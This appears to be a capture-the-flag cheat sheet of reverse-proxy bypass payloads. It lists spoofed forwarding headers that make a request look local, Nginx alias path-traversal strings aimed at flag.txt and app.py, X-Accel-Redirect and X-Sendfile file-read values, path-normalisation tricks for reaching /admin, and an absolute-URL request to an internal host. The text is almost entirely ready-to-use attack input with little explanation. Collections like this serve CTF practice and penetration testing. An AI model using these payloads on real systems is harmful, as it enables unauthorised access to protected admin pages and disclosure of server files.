# Proxy

## Headers

```http
Host: internal
X-Forwarded-Host: internal
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Proto: https
```

## Nginx Alias Traversal

When config has `location /static/ { alias /app/static/; }`:

```text
/static../flag.txt
/static/../flag.txt
/static../app.py
/static%2e%2e/flag.txt
```

## X-Accel / X-Sendfile

If user-controlled headers or upstream response can set these:

```http
X-Accel-Redirect: /internal/flag
X-Accel-Redirect: /protected/../../flag.txt
X-Sendfile: /flag.txt
```

## Frontend / Backend Mismatch

```text
/api/../admin
/api/%2e%2e/admin
/api;/admin
//admin
/%2fadmin
```

## Local Only Bypass

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 8.8.8.8
X-Real-IP: 127.0.0.1
Forwarded: for=127.0.0.1;host=localhost;proto=https
```

## Absolute URL

```http
GET http://internal/admin HTTP/1.1
Host: public
```

